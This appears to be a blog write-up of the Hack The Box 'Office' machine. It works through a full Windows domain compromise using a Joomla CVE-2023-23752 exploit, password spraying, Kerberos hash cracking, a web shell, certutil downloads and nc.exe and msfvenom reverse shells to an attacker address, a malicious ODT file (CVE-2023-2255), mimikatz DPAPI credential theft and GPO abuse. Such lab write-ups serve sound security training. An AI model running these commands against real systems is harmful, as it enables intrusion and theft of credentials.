---
title: HTB-Office
draft: false
tags:
  - htb
  - windows
  - hard
  - joomla
  - cve-2023-23752
  - kerbrute
  - password-spray
  - wireshark
  - kerberos-crack
  - joomla-rce
  - certutil
  - runascs
  - chisel
  - cve-2023-2255
  - jaws
  - stored-credentials
  - mimikatz
  - dpapi
  - gpo
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/Office.png)

## Information Gathering
### Rustscan

Let's do full port scan with Rustscan:

`rustscan --addresses 10.10.11.3 --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-6.png)

Based on the ports open, this machine seems to be a Domain Controller.

## Enumeration
### SMB - TCP 445

We will first enumerate smb with **crackmapexec**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-1.png)

Crackmapexec find the domain name(**office.htb**). Let's add it to `/etc/hosts`.

Unfortunately, null login directory listing fails:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-2.png)

We would have to come back after we gain access to valid credentials. Let's move on. 

### RPC - TCP 135

We can try null login with **rpcclient**:

`rpcclient -U "" -N 10.10.11.3`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-3.png)

However, this is also access denied. 

### HTTPs - TCP 443

HTTPs is running on port 443 but the website is forbidden. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-4.png)


### HTTP - TCP 80

We can access the website running on HTTP. 

Website seems to be all about **Tony Stark** and **Iron Man**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image.png)

It is a simple website that describes about the movie Iron man and the author is written as **Tony Stark**.

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-5.png)

We would be able create custom wordlist using **Tony Stark** username later on when we **Kerbrute** or **AS-REP Roast** on the domain.

Let's see if there are any interesting hidden directories:

`feroxbuster -u http://office.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-9.png)

Feroxbuster finds tons of new directories and `/Administrator` stands out.

`/administrator` is a login portal for **Joomla Administrator**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-10.png)

And yes, CMS for this website is **Joomla**

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/of-wap.png)

Based on [HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#version), let's check out Joomla's version:

`/administrator/manifests/files/joomla.xml`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-7.png)

We can successfully identify the version: **4.2.7**

## User dwolfe Pwn
### CVE-2023-23752

Googling on known exploits regarding **Joomla 4.2.7**, it seems like **CVE-2023-23752** is vulnerable to it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-8.png)

Let's download the exploit from [here](https://github.com/Acceis/exploit-CVE-2023-23752).

Running the exploit towards the website, it throws back us with MySQL password: **H0lOgrams4reTakIng0Ver754!**

`ruby exploit.rb http://office.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-11.png)

It has also discovered new domain(**holography.htb**), which we add to `/etc/hosts`.

We have tried using this credentials for both the website and towards services on the domain but it was working. 

We would have to discover more users and try spraying passwords on those users. 

### Kerbrute

Let's create a custom wordlist containing common usernames along with possible username variaion for the user **Tony Stark**. 

We will run **Kerbrute** with out custom userlist:

`./kerbrute_linux_amd64 userenum -d office.htb --dc 10.10.11.3 ~/Documents/htb/office/users.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-18.png)

Kerbrute find several users on the domain, inclusing **tstark**. 

### Password Spraying

Now that we have list of valid users, let's spray the password on those users using crackmapexec:

`crackmapexec smb 10.10.11.3 -u users.txt -p 'H0lOgrams4reTakIng0Ver754!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-12.png)

We get valid match for user **dwolfe**.

## User tstark Pwn
### SMB Access

Now that we can access smb using credentials for **dwolfe**, let's see what shares are there:

`crackmapexec smb 10.10.11.3 -u dwolfe -p 'H0lOgrams4reTakIng0Ver754!' --shares`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-14.png)

Among the shares where **dwolfe** has the read permission to, **SOC Analysis** shares looks the most interesting. 

Let's download the file **Latest-System-Dump-8fbc124d.pcap** using **smbclient**:

`sudo smbclient '//10.10.11.3/Soc Analysis' -U dwolfe%'H0lOgrams4reTakIng0Ver754!'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-15.png)

### Wireshark

Now that we have downloaded the **pcap** file, let's open it with **Wireshark** and enumerate it. 

Since we are enumerating **Domain Controller** machine, let's filter for **Kerberos**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-16.png)

There are two **AS-REQ** recordings found. 

Taking a closer look at the second AS-REQ, there is a password hash that was used when authenticating:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-17.png)

Based on [this article](https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/), let's attempt to crack this hash. 

We will first format the hash as such with the potential username(**tstark**), domain name(**office.htb**), and the hash:

```
$krb5pa$18$tstark$OFFICE.HTB$a16f4806da05760af63c566d566f071c5bb35d0a414459417613a9d67932a6735704d0832767af226aaa7360338a34746a00a3765386f5fc
```

Now using hashcat, we should be able to crack the hash:

`hashcat -m 19900 hash ~/Downloads/rockyou.txt`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/of-hash.png)


Hash is cracked successfully and we obtained the credentials for 
**tstark**:**playboy69**

## Shell as web_account
### Joomla RCE

We have tried login to administrator portal using the credentials as **tstark** but it didn't work. 

Let's try the password for tstark with the username of **administrator**, since **Tony Stark** user seemed to be the admin on the website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-13.png)

Luckily, login was successful and we now have access to the **dashboard**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-19.png)

Doing some research, it seems like Joomla is vulnerable to [RCE](https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla#rce)


Go to **System** -> **Templates**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-20.png)

Cliking on **Site Templates**, we can the template running on the current website:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-21.png)

Let's replace the **index.php** of the template with [p0wny-shell](https://github.com/flozz/p0wny-shell):

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-22.png)

Reloading **office.htb**, we get a web shell as **web_account**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-23.png)

Let's spawn a reverse shell on our netcat listener. 

On **p0wny-shell**, let's download **nc.exe** using **certutil.exe**:

`certutil.exe -urlcache -split -f http://10.10.14.36:8000/nc.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-27.png)

Running nc.exe towards our netcat listener, we should be able to spawn a shell:

`./nc.exe -e cmd.exe 10.10.14.36 1337`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-28.png)

Now we have an interactive shell as **web_account**.


## Privesc: web_account to tstark
### RunasCS

Checking on what users are there on `C:\Users`, we see user **tstark**. 

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-26.png)

Earlier, we already have cracked the password for *tstark*: **playboy69**

We should be able to run commands as **tstark** as long we have the correct password using **RunasCs.exe**.

Let's start up Python web server on the directory where we have **RunasCs.exe**: 

`python3 -m http.server`

We can use the command `certutil.exe -urlcache -split -f http://10.10.14.36:8000/RunasCs.exe` to download **RunasCs.exe**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-30.png)

> HTB-Solarlab also includes utilizing RunasCs.exe. You can find my writeup [here](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Solarlab#runascsexe)

We can verify RunasCs working through by sending `whoami` command:

`.\RunasCs.exe tstark playboy69 "whoami"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-31.png)


Now that we know that we can execute commands as **tstark**, let's spawn a reverse shell:

`.\RunasCs.exe tstark playboy69 cmd.exe -r 10.10.14.36:1338`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-32.png)

As the above command is executed, we get reverse shell connection as **tstark** on our netcat listener:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-33.png)

## Privesc: tstark to ppotts
### Local Enumeration

Let's start by looking for any interesting ports that are open:

`netstat -ano`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-34.png)

Port **8083** is open but Rustscan didn't catch that. Let's forward the port back to us and take a look at it.
### Chisel

We will first download **chisel** using certutil.exe:

`certutil.exe -urlcache -split -f http://10.10.14.36:8000/chisel_windows.exe`

On our attacking Kali machine, let's start up chisel server with listener at port 9999:

`chisel server -p 9999 --reverse`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-35.png)

On the target machine, we will run chisel client, forwarding port 8083 to Kali's port 9999:

`.\chisel_windows.exe client 10.10.14.36:9999 R:8083:127.0.0.1:8083`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-36.png)

Now we can access port 8083 through our Kali's web browser:

`http://127.0.0.1:8083/`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-37.png)

### CVE-2023-2255

Let's enumerate the website. 

At the bottom of the page, domain name is revealed, which we add to `/etc/hosts`:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-38.png)

There is a **Job Application Submission** form at `/resume.php`:

`http://127.0.0.1:8083/resume.php`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-39.png)


We tried throwing in random data and file, but it is rejected saying only **doc**, **docx**, **docm**, and **odt** is allowed:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-40.png)

After we changed the file extension to .odt, we can successfully submit the file:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-41.png)


Researching a bit on this, it seems like this form could be vulnerable to **CVE-2023-2255**.

Let's use [this exploit](https://github.com/elweth-sec/CVE-2023-2255/blob/main/README.md) to generate malicious payload. 

We will first create a malicious payload using msfvenom that will spawn reverse shell connection back to us when it is triggered:

`sudo msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.36 LPORT=9001 -f exe -o shell.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-42.png)

We will upload the generated payload to the target using certutil.exe:

`certutil.exe -urlcache -split -f http://10.10.14.36:1235/shell.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-45.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-48.png)

Now that the payload is created and transferred to the system, we would have to upload a malicious odt file that will execute the command to run the payload.

We will create a odt file named **exploit-run.odt** that will run **shell.exe** which is already uploaded to the target system:

`sudo python3 cve-2023-2255.py --cmd 'C:\Users\Public\shell.exe' --output 'exploit-run.odt'`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-43.png)

Let's upload the malicious odt file to the form:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-50.png)

It is uploaded successfully:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-49.png)

Within few seconds, reverse shell connection is spawned on our local netcat listener as the user **ppotts**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-51.png)



## Privesc: ppotts to hhogan
### JAWS

Let's run automation script for privilege escalation. 

We will upload **jaws-enum.ps1** using certutil.exe:

`certutil.exe -urlcache -split -f http://10.10.14.36:1236/jaws-enum.ps1`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-52.png)

We can launch the scan using the command: `./jaws-enum.ps1`

After waiting a bit for the scan to finish, we can see that JAWS discovered **Stored Credentials**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-53.png)

Let's verify the presence of stored credentials on the system:

`cmdkey /list`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-54.png)

> HTB-Access also includes abusing stored credentials. I have a writeup [here](https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Access#privesc-security-to-administrator)

### Mimikatz

Let's follow [this guide](https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials) to obtain the stored password.

On `C:\Users\ppotts\AppData\Roaming\Microsoft\Credentials`, you can list credential folders:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-55.png)

Let's upload **mimikatz.exe** to the target machine using **certutil.exe**:

`certutil.exe -urlcache -split -f http://10.10.14.36:1236/mimikatz.exe`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-56.png)


> **`dpapi::cred`**: This module in Mimikatz is used for handling DPAPI (Data Protection API) credentials. DPAPI is a Windows feature that allows applications to securely store sensitive data such as passwords, encryption keys, and other confidential information.

We will use `dpapi::cred` to pass files containing credentials and retrieve our guidmaster key.

We can use this key to access stored credentials.

First file:

`dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-57.png)

Second file:

`dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\18A1927A997A794B65E9849883AC3F3E`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-58.png)

Third file:

`dpapi::cred /in:C:\Users\PPotts\AppData\Roaming\Microsoft\credentials\E76CCA3670CD9BB98DF79E0A8D176F1E`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-59.png)

Now that we have obtained guidmaster key, let's move from credentials folder to the protect folder and retrieve master key. This key will be used for decrypting the credentials later. 

`PS C:\users\ppotts\appdata\roaming\Microsoft\Protect> dir`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-60.png)

When we inspect the protect directory, we can see that the same guidmaster keys that we previously obtained from the credentials folder is found in it:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-61.png)
 
We need to use the full path mentioned above and append “`/rpc`” to it, as shown in the image. This action will provide us with the master key necessary for decrypting the passwords into clear text.

`dpapi::masterkey /in:C:\\users\ppotts\appdata\roaming\Microsoft\Protect\S-1-5-21-1199398058-4196589450-691661856-1107\191d3f9d-7959-4b4d-a520-a444853c47eb /rpc`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-62.png)

By the end of the output, we can see the master key:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-63.png)

We will now utilize the master key and decrypt the credentials stored in the protected directory in clear test: **H4ppyFtW183#**

`dpapi::cred /in:C:\users\ppotts\appdata\roaming\Microsoft\credentials\84F1CAEEBF466550F4967858F9353FB4 /masterkey:87eedae4c65e0db47fcbc3e7e337c4cce621157863702adc224caf2eedcfbdbaadde99ec95413e18b0965dcac70344ed9848cd04f3b9491c336c4bde4d1d8166`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-64.png)

Now that we have the password, we should be able to access winrm as **hhogan**:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-65.png)

We now have a stable shell as the user **hhogan**.
## Privesc: hhogan to system

Let's first check information regarding hhogan.

Upon inspecting the user’s privileges and group memberships, we can see that user **hhogan** is part of the “**GPO manager**” group. This indicates that the user has the ability to manage Group Policy Objects (**GPOs**) or potentially abuse them to gain access to the administrator account:

`whoami /all`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-66.png)


We will first list out all GPOs for potential exploits:

`Get-GPO -All | Select-Object -ExpandProperty DisplayName`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-67.png)

Using [HackTricks](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo) as the guide, we should be able to escalate our privilege to administrator. 

Let's download and upload [SharpGPOAbuse](https://github.com/byronkg/SharpGPOAbuse) to the system:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-68.png)

We will use **SharpGPOAbuse** to add user HHogan as the local administrator:

`./SharpGPOAbuse.exe --AddLocalAdmin --UserAccount HHogan --GPOName "Default Domain Policy"`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-69.png)

We will update windows group policy setting:

`gpupdate /force`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-70.png)

We can verify that user **hhogan** is in the administrators group:

`net localgroup Administrators`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-71.png)

Using **psexec**, we now have spawned interactive shell as the system:

`psexec.py HHogan:H4ppyFtW183#@10.10.11.3`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/office/image-72.png)


## References
- https://github.com/Acceis/exploit-CVE-2023-23752
- https://medium.com/@robert.broeckelmann/kerberos-wireshark-captures-a-windows-login-example-151fabf3375a
- https://vbscrub.com/2020/02/27/getting-passwords-from-kerberos-pre-authentication-packets/
- https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Solarlab#runascsexe
- https://github.com/elweth-sec/CVE-2023-2255/blob/main/README.md
- https://jadu101.github.io/Hackthebox%F0%9F%93%A6/Windows%F0%9F%93%98/HTB-Access#privesc-security-to-administrator
- https://github.com/gentilkiwi/mimikatz/wiki/howto-~-credential-manager-saved-credentials
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/acl-persistence-abuse#sharpgpoabuse-abuse-gpo
- https://github.com/byronkg/SharpGPOAbuse